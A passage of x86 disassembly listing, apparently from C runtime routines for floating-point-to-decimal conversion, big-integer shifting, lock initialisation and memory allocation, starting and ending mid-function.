  4091f9:	movzx  edx,BYTE PTR [ebx-0x1]
  4091fd:	mov    ecx,DWORD PTR [esp+0x38]
  409201:	jmp    0x409211
  409203:	cmp    eax,ecx
  409205:	je     0x40940c
  40920b:	movzx  edx,BYTE PTR [eax-0x1]
  40920f:	mov    ebx,eax
  409211:	cmp    dl,0x39
  409214:	lea    eax,[ebx-0x1]
  409217:	je     0x409203
  409219:	add    edx,0x1
  40921c:	mov    edi,0x20
  409221:	mov    BYTE PTR [eax],dl
  409223:	mov    eax,DWORD PTR [esp+0x10]
  409227:	mov    DWORD PTR [esp],eax
  40922a:	call   0x409ce0
  40922f:	test   esi,esi
  409231:	je     0x409338
  409237:	mov    eax,DWORD PTR [esp+0x28]
  40923b:	cmp    eax,esi
  40923d:	je     0x40924f
  40923f:	test   eax,eax
  409241:	je     0x40924f
  409243:	mov    eax,DWORD PTR [esp+0x28]
  409247:	mov    DWORD PTR [esp],eax
  40924a:	call   0x409ce0
  40924f:	mov    eax,DWORD PTR [esp+0x1c]
  409253:	add    eax,0x1
  409256:	mov    DWORD PTR [esp+0x1c],eax
  40925a:	jmp    0x408b90
  40925f:	fld    QWORD PTR [esp+0x10]
  409263:	fnstcw WORD PTR [esp+0x5e]
  409267:	movzx  eax,WORD PTR [esp+0x5e]
  40926c:	mov    esi,DWORD PTR [esp+0x38]
  409270:	mov    DWORD PTR [esp+0x6c],0x1
  409278:	fld    st(0)
  40927a:	fdiv   st,st(2)
  40927c:	mov    ah,0xc
  40927e:	lea    ebx,[esi+0x1]
  409281:	mov    WORD PTR [esp+0x5c],ax
  409286:	fldcw  WORD PTR [esp+0x5c]
  40928a:	fistp  DWORD PTR [esp+0x58]
  40928e:	fldcw  WORD PTR [esp+0x5e]
  409292:	mov    eax,DWORD PTR [esp+0x58]
  409296:	mov    DWORD PTR [esp+0x10],eax
  40929a:	lea    edx,[eax+0x30]
  40929d:	fild   DWORD PTR [esp+0x10]
  4092a1:	mov    BYTE PTR [esi],dl
  4092a3:	fmul   st,st(2)
  4092a5:	fsubp  st(1),st
  4092a7:	fldz   
  4092a9:	fxch   st(1)
  4092ab:	fucomi st,st(1)
  4092ad:	fstp   st(1)
  4092af:	jp     0x4092b3
  4092b1:	je     0x409322
  4092b3:	mov    edx,DWORD PTR [esp+0x6c]
  4092b7:	cmp    DWORD PTR [esp+0x2c],edx
  4092bb:	je     0x4093e8
  4092c1:	fld    DWORD PTR ds:0x40e03c
  4092c7:	mov    ecx,DWORD PTR [esp+0x2c]
  4092cb:	jmp    0x4092dc
  4092cd:	lea    esi,[esi+0x0]
  4092d0:	mov    edx,DWORD PTR [esp+0x6c]
  4092d4:	cmp    ecx,edx
  4092d6:	je     0x4093e6
  4092dc:	fmul   st(1),st
  4092de:	add    edx,0x1
  4092e1:	add    ebx,0x1
  4092e4:	mov    DWORD PTR [esp+0x6c],edx
  4092e8:	fld    st(1)
  4092ea:	fdiv   st,st(3)
  4092ec:	fldcw  WORD PTR [esp+0x5c]
  4092f0:	fistp  DWORD PTR [esp+0x58]
  4092f4:	fldcw  WORD PTR [esp+0x5e]
  4092f8:	mov    eax,DWORD PTR [esp+0x58]
  4092fc:	mov    DWORD PTR [esp+0x10],eax
  409300:	lea    edx,[eax+0x30]
  409303:	fild   DWORD PTR [esp+0x10]
  409307:	mov    BYTE PTR [ebx-0x1],dl
  40930a:	fmul   st,st(3)
  40930c:	fsubp  st(2),st
  40930e:	fldz   
  409310:	fxch   st(2)
  409312:	fucomi st,st(2)
  409314:	fstp   st(2)
  409316:	jp     0x4092d0
  409318:	jne    0x4092d0
  40931a:	fstp   st(0)
  40931c:	fstp   st(0)
  40931e:	fstp   st(0)
  409320:	jmp    0x409326
  409322:	fstp   st(0)
  409324:	fstp   st(0)
  409326:	mov    eax,DWORD PTR [esp+0x1c]
  40932a:	add    eax,0x1
  40932d:	xor    edi,edi
  40932f:	mov    DWORD PTR [esp+0x1c],eax
  409333:	jmp    0x408990
  409338:	mov    eax,DWORD PTR [esp+0x1c]
  40933c:	add    eax,0x1
  40933f:	mov    DWORD PTR [esp+0x1c],eax
  409343:	jmp    0x408990
  409348:	cmp    DWORD PTR [esp+0x2c],0xe
  40934d:	mov    DWORD PTR [esp+0x6c],0x1
  409355:	setbe  dl
  409358:	and    eax,edx
  40935a:	mov    BYTE PTR [esp+0x48],al
  40935e:	mov    eax,0x1
  409363:	jmp    0x4087b3
  409368:	mov    edx,0x1
  40936d:	mov    DWORD PTR [esp+0xa4],0x1
  409378:	jmp    0x408a5a
  40937d:	mov    edx,DWORD PTR [esp+0x3c]
  409381:	mov    ebx,DWORD PTR [esp+0x34]
  409385:	jmp    0x408c42
  40938a:	mov    BYTE PTR [esp+0x48],0x0
  40938f:	mov    DWORD PTR [esp+0x40],0x1
  409397:	mov    DWORD PTR [esp+0x54],0xffffffff
  40939f:	mov    DWORD PTR [esp+0x2c],0xffffffff
  4093a7:	mov    DWORD PTR [esp+0xa4],0x0
  4093b2:	jmp    0x4087d2
  4093b7:	mov    eax,DWORD PTR [esp+0x90]
  4093be:	mov    eax,DWORD PTR [eax+0x4]
  4093c1:	add    eax,0x1
  4093c4:	cmp    DWORD PTR [esp+0x94],eax
  4093cb:	jle    0x408d12
  4093d1:	add    DWORD PTR [esp+0x34],0x1
  4093d6:	add    edi,0x1
  4093d9:	mov    DWORD PTR [esp+0x28],0x1
  4093e1:	jmp    0x408e10
  4093e6:	fstp   st(0)
  4093e8:	mov    edx,DWORD PTR [esp+0x20]
  4093ec:	test   edx,edx
  4093ee:	je     0x40973c
  4093f4:	fstp   st(0)
  4093f6:	fstp   st(0)
  4093f8:	cmp    DWORD PTR [esp+0x20],0x1
  4093fd:	je     0x409831
  409403:	mov    eax,DWORD PTR [esp+0x1c]
  409407:	jmp    0x408983
  40940c:	mov    eax,DWORD PTR [esp+0x38]
  409410:	add    DWORD PTR [esp+0x1c],0x1
  409415:	mov    edi,0x20
  40941a:	mov    BYTE PTR [eax],0x31
  40941d:	jmp    0x409223
  409422:	fstp   st(0)
  409424:	fstp   st(0)
  409426:	mov    DWORD PTR [esp+0x1c],0x2
  40942e:	mov    DWORD PTR [esp+0x10],0x0
  409436:	xor    esi,esi
  409438:	jmp    0x408b6d
  40943d:	fld    QWORD PTR [esp+0x10]
  409441:	fnstcw WORD PTR [esp+0x5e]
  409445:	movzx  eax,WORD PTR [esp+0x5e]
  40944a:	mov    DWORD PTR [esp+0x6c],0x1
  409452:	mov    ebx,DWORD PTR [esp+0x38]
  409456:	fmul   QWORD PTR [ecx*8+0x40e0b8]
  40945d:	mov    ah,0xc
  40945f:	mov    WORD PTR [esp+0x5c],ax
  409464:	fld    DWORD PTR ds:0x40e03c
  40946a:	fxch   st(2)
  40946c:	jmp    0x409479
  40946e:	xchg   ax,ax
  409470:	fmul   st,st(2)
  409472:	add    edx,0x1
  409475:	mov    DWORD PTR [esp+0x6c],edx
  409479:	fldcw  WORD PTR [esp+0x5c]
  40947d:	fist   DWORD PTR [esp+0x58]
  409481:	fldcw  WORD PTR [esp+0x5e]
  409485:	mov    eax,DWORD PTR [esp+0x58]
  409489:	test   eax,eax
  40948b:	je     0x409497
  40948d:	mov    DWORD PTR [esp+0x10],eax
  409491:	fild   DWORD PTR [esp+0x10]
  409495:	fsubp  st(1),st
  409497:	add    ebx,0x1
  40949a:	add    eax,0x30
  40949d:	mov    BYTE PTR [ebx-0x1],al
  4094a0:	mov    edx,DWORD PTR [esp+0x6c]
  4094a4:	cmp    edx,ecx
  4094a6:	jne    0x409470
  4094a8:	fstp   st(2)
  4094aa:	fxch   st(1)
  4094ac:	fld    DWORD PTR ds:0x40e04c
  4094b2:	fld    st(2)
  4094b4:	fadd   st,st(1)
  4094b6:	fxch   st(2)
  4094b8:	fucomi st,st(2)
  4094ba:	fstp   st(2)
  4094bc:	ja     0x409523
  4094be:	fsubrp st(2),st
  4094c0:	fxch   st(1)
  4094c2:	fucomip st,st(1)
  4094c4:	jbe    0x408ad7
  4094ca:	fldz   
  4094cc:	fxch   st(1)
  4094ce:	fucomip st,st(1)
  4094d0:	fstp   st(0)
  4094d2:	jp     0x4098ed
  4094d8:	jne    0x4098ed
  4094de:	xor    edi,edi
  4094e0:	jmp    0x4094e8
  4094e2:	movzx  eax,BYTE PTR [ebx-0x2]
  4094e6:	mov    ebx,edx
  4094e8:	cmp    al,0x30
  4094ea:	lea    edx,[ebx-0x1]
  4094ed:	je     0x4094e2
  4094ef:	mov    eax,DWORD PTR [esp+0x48]
  4094f3:	add    eax,0x1
  4094f6:	mov    DWORD PTR [esp+0x1c],eax
  4094fa:	jmp    0x408990
  4094ff:	mov    esi,DWORD PTR [esp+0x1c]
  409503:	test   al,0x1
  409505:	movzx  eax,BYTE PTR [ebx-0x1]
  409509:	mov    DWORD PTR [esp+0x48],esi
  40950d:	je     0x4098ed
  409513:	jmp    0x409529
  409515:	fstp   st(0)
  409517:	fstp   st(0)
  409519:	jmp    0x409529
  40951b:	fstp   st(0)
  40951d:	fstp   st(0)
  40951f:	fstp   st(0)
  409521:	jmp    0x409529
  409523:	fstp   st(0)
  409525:	fstp   st(0)
  409527:	fstp   st(0)
  409529:	mov    ecx,DWORD PTR [esp+0x38]
  40952d:	jmp    0x40953e
  40952f:	nop
  409530:	cmp    edx,ecx
  409532:	je     0x4096b7
  409538:	movzx  eax,BYTE PTR [edx-0x1]
  40953c:	mov    ebx,edx
  40953e:	cmp    al,0x39
  409540:	lea    edx,[ebx-0x1]
  409543:	je     0x409530
  409545:	mov    DWORD PTR [esp+0x38],ecx
  409549:	add    eax,0x1
  40954c:	mov    BYTE PTR [edx],al
  40954e:	mov    eax,DWORD PTR [esp+0x48]
  409552:	mov    edi,0x20
  409557:	add    eax,0x1
  40955a:	mov    DWORD PTR [esp+0x1c],eax
  40955e:	jmp    0x408990
  409563:	mov    ecx,DWORD PTR [esp+0x20]
  409567:	mov    DWORD PTR [esp+0x34],ebx
  40956b:	mov    edx,DWORD PTR [esp+0x30]
  40956f:	mov    ebx,DWORD PTR [esp+0x28]
  409573:	test   ecx,ecx
  409575:	je     0x40980f
  40957b:	cmp    DWORD PTR [ebp+0x10],0x1
  40957f:	jle    0x409805
  409585:	cmp    DWORD PTR [esp+0x20],0x2
  40958a:	je     0x409823
  409590:	mov    edi,ebx
  409592:	mov    DWORD PTR [esp+0x20],edx
  409596:	mov    ebx,DWORD PTR [esp+0x34]
  40959a:	jmp    0x409603
  40959c:	lea    esi,[esi+eiz*1+0x0]
  4095a0:	movzx  eax,BYTE PTR [esp+0x20]
  4095a5:	add    edi,0x1
  4095a8:	mov    BYTE PTR [edi-0x1],al
  4095ab:	mov    DWORD PTR [esp],ebx
  4095ae:	mov    DWORD PTR [esp+0x8],0x0
  4095b6:	mov    DWORD PTR [esp+0x4],0xa
  4095be:	call   0x409d50
  4095c3:	cmp    esi,ebx
  4095c5:	mov    DWORD PTR [esp],ebp
  4095c8:	mov    DWORD PTR [esp+0x8],0x0
  4095d0:	mov    DWORD PTR [esp+0x4],0xa
  4095d8:	cmove  esi,eax
  4095db:	mov    DWORD PTR [esp+0x28],eax
  4095df:	call   0x409d50
  4095e4:	mov    ebp,eax
  4095e6:	mov    eax,DWORD PTR [esp+0x10]
  4095ea:	mov    DWORD PTR [esp],ebp
  4095ed:	mov    DWORD PTR [esp+0x4],eax
  4095f1:	call   0x408260
  4095f6:	mov    edx,DWORD PTR [esp+0x28]
  4095fa:	add    eax,0x30
  4095fd:	mov    DWORD PTR [esp+0x20],eax
  409601:	mov    ebx,edx
  409603:	mov    eax,DWORD PTR [esp+0x10]
  409607:	mov    DWORD PTR [esp+0x4],ebx
  40960b:	mov    DWORD PTR [esp],eax
  40960e:	call   0x40a290
  409613:	test   eax,eax
  409615:	jg     0x4095a0
  409617:	mov    edx,DWORD PTR [esp+0x20]
  40961b:	mov    DWORD PTR [esp+0x34],ebx
  40961f:	mov    ebx,edi
  409621:	cmp    edx,0x39
  409624:	je     0x409858
  40962a:	add    edx,0x1
  40962d:	mov    edi,0x20
  409632:	mov    BYTE PTR [ebx],dl
  409634:	mov    DWORD PTR [esp+0x28],esi
  409638:	add    ebx,0x1
  40963b:	mov    esi,DWORD PTR [esp+0x34]
  40963f:	jmp    0x409223
  409644:	mov    DWORD PTR [esp],ebp
  409647:	mov    DWORD PTR [esp+0x4],0x1
  40964f:	call   0x40a160
  409654:	mov    ebp,eax
  409656:	mov    eax,DWORD PTR [esp+0x10]
  40965a:	mov    DWORD PTR [esp],ebp
  40965d:	mov    DWORD PTR [esp+0x4],eax
  409661:	call   0x40a290
  409666:	cmp    eax,0x0
  409669:	jg     0x4091f9
  40966f:	jne    0x40967c
  409671:	test   BYTE PTR [esp+0x30],0x1
  409676:	jne    0x4091f9
  40967c:	cmp    DWORD PTR [ebp+0x10],0x1
  409680:	mov    edi,0x10
  409685:	jg     0x409692
  409687:	jmp    0x409964
  40968c:	lea    esi,[esi+eiz*1+0x0]
  409690:	mov    ebx,eax
  409692:	cmp    BYTE PTR [ebx-0x1],0x30
  409696:	lea    eax,[ebx-0x1]
  409699:	je     0x409690
  40969b:	jmp    0x409223
  4096a0:	mov    ebx,DWORD PTR [esp+0x34]
  4096a4:	mov    DWORD PTR [esp+0x6c],0x0
  4096ac:	xor    eax,eax
  4096ae:	sub    ebx,DWORD PTR [esp+0x2c]
  4096b2:	jmp    0x408c42
  4096b7:	mov    DWORD PTR [esp+0x38],ecx
  4096bb:	add    DWORD PTR [esp+0x48],0x1
  4096c0:	mov    edx,ecx
  4096c2:	mov    BYTE PTR [ecx],0x30
  4096c5:	mov    eax,0x31
  4096ca:	jmp    0x40954c
  4096cf:	mov    eax,DWORD PTR [esi+0x4]
  4096d2:	mov    DWORD PTR [esp],eax
  4096d5:	call   0x409c10
  4096da:	lea    ecx,[eax+0xc]
  4096dd:	mov    ebx,eax
  4096df:	mov    eax,DWORD PTR [esi+0x10]
  4096e2:	mov    DWORD PTR [esp],ecx
  4096e5:	lea    edx,[eax*4+0x8]
  4096ec:	lea    eax,[esi+0xc]
  4096ef:	mov    DWORD PTR [esp+0x8],edx
  4096f3:	mov    DWORD PTR [esp+0x4],eax
  4096f7:	call   0x40ace8
  4096fc:	mov    DWORD PTR [esp+0x4],0x1
  409704:	mov    DWORD PTR [esp],ebx
  409707:	call   0x40a160
  40970c:	mov    DWORD PTR [esp+0x34],eax
  409710:	jmp    0x408f71
  409715:	mov    eax,DWORD PTR [esp+0x90]
  40971c:	mov    DWORD PTR [esp+0x28],0x0
  409724:	mov    eax,DWORD PTR [eax+0x4]
  409727:	add    eax,0x1
  40972a:	cmp    DWORD PTR [esp+0x94],eax
  409731:	jle    0x408e10
  409737:	jmp    0x4093d1
  40973c:	fadd   st,st(0)
  40973e:	fucomi st,st(1)
  409740:	ja     0x40982d
  409746:	fxch   st(1)
  409748:	fucomip st,st(1)
  40974a:	fstp   st(0)
  40974c:	jp     0x409754
  40974e:	je     0x4094ff
  409754:	mov    esi,DWORD PTR [esp+0x1c]
  409758:	movzx  eax,BYTE PTR [ebx-0x1]
  40975c:	mov    edi,0x10
  409761:	mov    DWORD PTR [esp+0x48],esi
  409765:	jmp    0x4094e8
  40976a:	cmp    DWORD PTR [esp+0x30],0x39
  40976f:	mov    DWORD PTR [esp+0x34],ebx
  409773:	mov    ebx,DWORD PTR [esp+0x28]
  409777:	mov    eax,ebx
  409779:	je     0x40985a
  40977f:	movzx  eax,BYTE PTR [esp+0x30]
  409784:	mov    DWORD PTR [esp+0x28],esi
  409788:	add    ebx,0x1
  40978b:	mov    esi,DWORD PTR [esp+0x34]
  40978f:	mov    edi,0x20
  409794:	add    eax,0x1
  409797:	mov    BYTE PTR [ebx-0x1],al
  40979a:	jmp    0x409223
  40979f:	mov    eax,ebx
  4097a1:	mov    ebx,DWORD PTR [esp+0x28]
  4097a5:	mov    DWORD PTR [esp+0x28],esi
  4097a9:	mov    esi,eax
  4097ab:	jmp    0x4091da
  4097b0:	mov    eax,DWORD PTR [esp+0x2c]
  4097b4:	test   eax,eax
  4097b6:	je     0x408a7a
  4097bc:	mov    eax,DWORD PTR [esp+0x54]
  4097c0:	test   eax,eax
  4097c2:	jle    0x408adb
  4097c8:	mov    ecx,eax
  4097ca:	fmul   DWORD PTR ds:0x40e03c
  4097d0:	fld    st(0)
  4097d2:	fmul   DWORD PTR ds:0x40e040
  4097d8:	fadd   DWORD PTR ds:0x40e044
  4097de:	fstp   QWORD PTR [esp+0x48]
  4097e2:	mov    ebx,DWORD PTR [esp+0x4c]
  4097e6:	mov    edx,DWORD PTR [esp+0x48]
  4097ea:	mov    DWORD PTR [esp+0x48],0xffffffff
  4097f2:	sub    ebx,0x3400000
  4097f8:	mov    DWORD PTR [esp+0x10],edx
  4097fc:	mov    DWORD PTR [esp+0x14],ebx
  409800:	jmp    0x408878
  409805:	cmp    DWORD PTR [ebp+0x14],0x0
  409809:	jne    0x409585
  40980f:	test   eax,eax
  409811:	jg     0x4098a2
  409817:	xor    edi,edi
  409819:	cmp    DWORD PTR [ebp+0x10],0x1
  40981d:	jle    0x4098f7
  409823:	mov    edi,0x10
  409828:	jmp    0x409632
  40982d:	fstp   st(0)
  40982f:	fstp   st(0)
  409831:	mov    esi,DWORD PTR [esp+0x1c]
  409835:	movzx  eax,BYTE PTR [ebx-0x1]
  409839:	mov    ecx,DWORD PTR [esp+0x38]
  40983d:	mov    DWORD PTR [esp+0x48],esi
  409841:	jmp    0x40953e
  409846:	mov    edx,DWORD PTR [ebp+0x14]
  409849:	test   edx,edx
  40984b:	jne    0x4091f9
  409851:	xor    edi,edi
  409853:	jmp    0x409692
  409858:	mov    eax,ebx
  40985a:	mov    DWORD PTR [esp+0x28],esi
  40985e:	add    ebx,0x1
  409861:	mov    esi,DWORD PTR [esp+0x34]
  409865:	mov    BYTE PTR [eax],0x39
  409868:	mov    edx,0x39
  40986d:	mov    ecx,DWORD PTR [esp+0x38]
  409871:	jmp    0x409211
  409876:	mov    edx,DWORD PTR [esp+0x30]
  40987a:	mov    DWORD PTR [esp+0x34],ebx
  40987e:	mov    ebx,DWORD PTR [esp+0x28]
  409882:	cmp    edx,0x39
  409885:	mov    eax,ebx
  409887:	je     0x40985a
  409889:	test   edi,edi
  40988b:	jle    0x409974
  409891:	mov    edx,DWORD PTR [esp+0x3c]
  409895:	mov    edi,0x20
  40989a:	add    edx,0x31
  40989d:	jmp    0x409632
  4098a2:	mov    DWORD PTR [esp],ebp
  4098a5:	mov    DWORD PTR [esp+0x4],0x1
  4098ad:	mov    DWORD PTR [esp+0x20],edx
  4098b1:	call   0x40a160
  4098b6:	mov    ebp,eax
  4098b8:	mov    eax,DWORD PTR [esp+0x10]
  4098bc:	mov    DWORD PTR [esp],ebp
  4098bf:	mov    DWORD PTR [esp+0x4],eax
  4098c3:	call   0x40a290
  4098c8:	cmp    eax,0x0
  4098cb:	mov    edx,DWORD PTR [esp+0x20]
  4098cf:	jle    0x40994d
  4098d1:	mov    eax,DWORD PTR [esp+0x30]
  4098d5:	cmp    eax,0x39
  4098d8:	je     0x409858
  4098de:	add    eax,0x1
  4098e1:	mov    edi,0x20
  4098e6:	mov    edx,eax
  4098e8:	jmp    0x409819
  4098ed:	mov    edi,0x10
  4098f2:	jmp    0x4094e8
  4098f7:	cmp    DWORD PTR [ebp+0x14],0x0
  4098fb:	mov    eax,0x10
  409900:	cmovne edi,eax
  409903:	jmp    0x409632
  409908:	mov    DWORD PTR [esp],esi
  40990b:	mov    DWORD PTR [esp+0x8],0x0
  409913:	mov    DWORD PTR [esp+0x4],0xa
  40991b:	call   0x409d50
  409920:	mov    esi,eax
  409922:	mov    eax,DWORD PTR [esp+0x54]
  409926:	mov    ecx,DWORD PTR [esp+0x2c]
  40992a:	test   eax,eax
  40992c:	jg     0x409940
  40992e:	cmp    DWORD PTR [esp+0xa0],0x2
  409936:	mov    DWORD PTR [esp+0x2c],eax
  40993a:	jg     0x408da3
  409940:	mov    eax,DWORD PTR [esp+0x54]
  409944:	mov    DWORD PTR [esp+0x2c],eax
  409948:	jmp    0x408f4c
  40994d:	jne    0x40995a
  40994f:	test   BYTE PTR [esp+0x30],0x1
  409954:	jne    0x4098d1
  40995a:	mov    edi,0x20
  40995f:	jmp    0x409819
  409964:	cmp    DWORD PTR [ebp+0x14],0x1
  409968:	sbb    edi,edi
  40996a:	not    edi
  40996c:	and    edi,0x10
  40996f:	jmp    0x409692
  409974:	cmp    DWORD PTR [ebp+0x10],0x1
  409978:	mov    edi,0x10
  40997d:	jg     0x409632
  409983:	cmp    DWORD PTR [ebp+0x14],0x1
  409987:	sbb    edi,edi
  409989:	not    edi
  40998b:	and    edi,0x10
  40998e:	jmp    0x409632
  409993:	xor    eax,eax
  409995:	jmp    0x408586
  40999a:	nop
  40999b:	nop
  40999c:	nop
  40999d:	nop
  40999e:	nop
  40999f:	nop
  4099a0:	push   ebp
  4099a1:	push   edi
  4099a2:	push   esi
  4099a3:	push   ebx
  4099a4:	sub    esp,0x10
  4099a7:	mov    ebp,DWORD PTR [esp+0x24]
  4099ab:	mov    ecx,DWORD PTR [esp+0x28]
  4099af:	mov    edx,DWORD PTR [ebp+0x10]
  4099b2:	mov    eax,ecx
  4099b4:	lea    ebx,[ebp+0x14]
  4099b7:	sar    eax,0x5
  4099ba:	cmp    eax,edx
  4099bc:	jge    0x409a54
  4099c2:	lea    eax,[ebx+eax*4]
  4099c5:	and    ecx,0x1f
  4099c8:	lea    edi,[ebx+edx*4]
  4099cb:	mov    DWORD PTR [esp],ecx
  4099ce:	mov    DWORD PTR [esp+0x4],eax
  4099d2:	je     0x409a70
  4099d8:	mov    esi,DWORD PTR [esp]
  4099db:	mov    eax,0x20
  4099e0:	sub    eax,esi
  4099e2:	mov    DWORD PTR [esp],esi
  4099e5:	mov    DWORD PTR [esp+0x8],eax
  4099e9:	mov    eax,DWORD PTR [esp+0x4]
  4099ed:	mov    ecx,DWORD PTR [eax]
  4099ef:	lea    edx,[eax+0x4]
  4099f2:	mov    eax,ecx
  4099f4:	mov    ecx,esi
  4099f6:	shr    eax,cl
  4099f8:	cmp    edi,edx
  4099fa:	jbe    0x409ab9
  409a00:	mov    DWORD PTR [esp+0x24],ebp
  409a04:	mov    ebp,DWORD PTR [esp+0x8]
  409a08:	mov    esi,ebx
  409a0a:	mov    DWORD PTR [esp+0xc],ebx
  409a0e:	xchg   ax,ax
  409a10:	mov    ebx,DWORD PTR [edx]
  409a12:	mov    ecx,ebp
  409a14:	add    esi,0x4
  409a17:	add    edx,0x4
  409a1a:	shl    ebx,cl
  409a1c:	movzx  ecx,BYTE PTR [esp]
  409a20:	or     eax,ebx
  409a22:	mov    DWORD PTR [esi-0x4],eax
  409a25:	mov    eax,DWORD PTR [edx-0x4]
  409a28:	shr    eax,cl
  409a2a:	cmp    edi,edx
  409a2c:	ja     0x409a10
  409a2e:	sub    edi,DWORD PTR [esp+0x4]
  409a32:	mov    ebx,DWORD PTR [esp+0xc]
  409a36:	mov    ebp,DWORD PTR [esp+0x24]
  409a3a:	lea    edx,[edi-0x5]
  409a3d:	shr    edx,0x2
  409a40:	lea    edx,[ebx+edx*4+0x4]
  409a44:	test   eax,eax
  409a46:	mov    DWORD PTR [edx],eax
  409a48:	je     0x409ab0
  409a4a:	lea    eax,[edx+0x4]
  409a4d:	sub    eax,ebx
  409a4f:	sar    eax,0x2
  409a52:	jmp    0x409a99
  409a54:	mov    DWORD PTR [ebp+0x10],0x0
  409a5b:	mov    DWORD PTR [ebp+0x14],0x0
  409a62:	add    esp,0x10
  409a65:	pop    ebx
  409a66:	pop    esi
  409a67:	pop    edi
  409a68:	pop    ebp
  409a69:	ret    
  409a6a:	lea    esi,[esi+0x0]
  409a70:	cmp    edi,eax
  409a72:	jbe    0x409a54
  409a74:	add    eax,0x4
  409a77:	mov    edx,DWORD PTR [eax-0x4]
  409a7a:	add    ebx,0x4
  409a7d:	cmp    edi,eax
  409a7f:	mov    DWORD PTR [ebx-0x4],edx
  409a82:	ja     0x409a74
  409a84:	mov    eax,DWORD PTR [esp+0x4]
  409a88:	not    eax
  409a8a:	add    eax,edi
  409a8c:	shr    eax,0x2
  409a8f:	lea    eax,[eax*4+0x4]
  409a96:	sar    eax,0x2
  409a99:	test   eax,eax
  409a9b:	mov    DWORD PTR [ebp+0x10],eax
  409a9e:	je     0x409a5b
  409aa0:	add    esp,0x10
  409aa3:	pop    ebx
  409aa4:	pop    esi
  409aa5:	pop    edi
  409aa6:	pop    ebp
  409aa7:	ret    
  409aa8:	nop
  409aa9:	lea    esi,[esi+eiz*1+0x0]
  409ab0:	mov    eax,edx
  409ab2:	sub    eax,ebx
  409ab4:	sar    eax,0x2
  409ab7:	jmp    0x409a99
  409ab9:	mov    edx,ebx
  409abb:	jmp    0x409a44
  409abd:	lea    esi,[esi+0x0]
  409ac0:	push   ebx
  409ac1:	mov    eax,DWORD PTR [esp+0x8]
  409ac5:	mov    ecx,DWORD PTR [eax+0x10]
  409ac8:	lea    edx,[eax+0x14]
  409acb:	lea    ebx,[edx+ecx*4]
  409ace:	cmp    edx,ebx
  409ad0:	jae    0x409afa
  409ad2:	mov    ecx,DWORD PTR [eax+0x14]
  409ad5:	xor    eax,eax
  409ad7:	test   ecx,ecx
  409ad9:	je     0x409ae6
  409adb:	jmp    0x409af2
  409add:	lea    esi,[esi+0x0]
  409ae0:	mov    ecx,DWORD PTR [edx]
  409ae2:	test   ecx,ecx
  409ae4:	jne    0x409af2
  409ae6:	add    edx,0x4
  409ae9:	add    eax,0x20
  409aec:	cmp    ebx,edx
  409aee:	ja     0x409ae0
  409af0:	pop    ebx
  409af1:	ret    
  409af2:	tzcnt  ecx,ecx
  409af6:	add    eax,ecx
  409af8:	pop    ebx
  409af9:	ret    
  409afa:	xor    eax,eax
  409afc:	pop    ebx
  409afd:	ret    
  409afe:	nop
  409aff:	nop
  409b00:	push   esi
  409b01:	push   ebx
  409b02:	mov    esi,eax
  409b04:	sub    esp,0x14
  409b07:	mov    edx,DWORD PTR ds:0x410028
  409b0d:	cmp    edx,0x2
  409b10:	je     0x409b86
  409b12:	test   edx,edx
  409b14:	je     0x409b43
  409b16:	cmp    edx,0x1
  409b19:	jne    0x409b3d
  409b1b:	mov    ebx,DWORD PTR ds:0x4112f8
  409b21:	mov    DWORD PTR [esp],0x1
  409b28:	call   ebx
  409b2a:	mov    edx,DWORD PTR ds:0x410028
  409b30:	sub    esp,0x4
  409b33:	cmp    edx,0x1
  409b36:	je     0x409b21
  409b38:	cmp    edx,0x2
  409b3b:	je     0x409b86
  409b3d:	add    esp,0x14
  409b40:	pop    ebx
  409b41:	pop    esi
  409b42:	ret    
  409b43:	mov    eax,0x1
  409b48:	xchg   DWORD PTR ds:0x410028,eax
  409b4e:	test   eax,eax
  409b50:	jne    0x409ba2
  409b52:	mov    ebx,DWORD PTR ds:0x4112c8
  409b58:	mov    DWORD PTR [esp],0x410040
  409b5f:	call   ebx
  409b61:	sub    esp,0x4
  409b64:	mov    DWORD PTR [esp],0x410058
  409b6b:	call   ebx
  409b6d:	sub    esp,0x4
  409b70:	mov    DWORD PTR [esp],0x409bd0
  409b77:	call   0x402910
  409b7c:	mov    DWORD PTR ds:0x410028,0x2
  409b86:	lea    eax,[esi+esi*2]
  409b89:	lea    eax,[eax*8+0x410040]
  409b90:	mov    DWORD PTR [esp],eax
  409b93:	call   DWORD PTR ds:0x411284
  409b99:	sub    esp,0x4
  409b9c:	add    esp,0x14
  409b9f:	pop    ebx
  409ba0:	pop    esi
  409ba1:	ret    
  409ba2:	cmp    eax,0x2
  409ba5:	je     0x409bc0
  409ba7:	mov    edx,DWORD PTR ds:0x410028
  409bad:	cmp    edx,0x1
  409bb0:	je     0x409b1b
  409bb6:	jmp    0x409b38
  409bb8:	nop
  409bb9:	lea    esi,[esi+eiz*1+0x0]
  409bc0:	mov    DWORD PTR ds:0x410028,0x2
  409bca:	jmp    0x409b86
  409bcc:	lea    esi,[esi+eiz*1+0x0]
  409bd0:	mov    eax,0x3
  409bd5:	xchg   DWORD PTR ds:0x410028,eax
  409bdb:	cmp    eax,0x2
  409bde:	je     0x409be1
  409be0:	ret    
  409be1:	push   ebx
  409be2:	sub    esp,0x18
  409be5:	mov    ebx,DWORD PTR ds:0x411280
  409beb:	mov    DWORD PTR [esp],0x410040
  409bf2:	call   ebx
  409bf4:	sub    esp,0x4
  409bf7:	mov    DWORD PTR [esp],0x410058
  409bfe:	call   ebx
  409c00:	sub    esp,0x4
  409c03:	add    esp,0x18
  409c06:	pop    ebx
  409c07:	ret    
  409c08:	nop
  409c09:	lea    esi,[esi+eiz*1+0x0]
  409c10:	push   edi
  409c11:	push   esi
  409c12:	xor    eax,eax
  409c14:	push   ebx
  409c15:	sub    esp,0x10
  409c18:	mov    ebx,DWORD PTR [esp+0x20]
  409c1c:	call   0x409b00
  409c21:	cmp    ebx,0x9
  409c24:	jg     0x409c55
  409c26:	mov    edi,DWORD PTR [ebx*4+0x410000]
  409c2d:	test   edi,edi
  409c2f:	je     0x409ca0
  409c31:	cmp    DWORD PTR ds:0x410028,0x2
  409c38:	mov    edx,DWORD PTR [edi]
  409c3a:	mov    DWORD PTR [ebx*4+0x410000],edx
  409c41:	jne    0x409c88
  409c43:	mov    DWORD PTR [esp],0x410040
  409c4a:	call   DWORD PTR ds:0x4112d8
  409c50:	sub    esp,0x4
  409c53:	jmp    0x409c88
  409c55:	mov    esi,0x1
  409c5a:	mov    ecx,ebx
  409c5c:	shl    esi,cl
  409c5e:	lea    edx,[esi*4+0x1b]
  409c65:	shr    edx,0x3
  409c68:	shl    edx,0x3
  409c6b:	mov    DWORD PTR [esp],edx
  409c6e:	call   0x40acf0
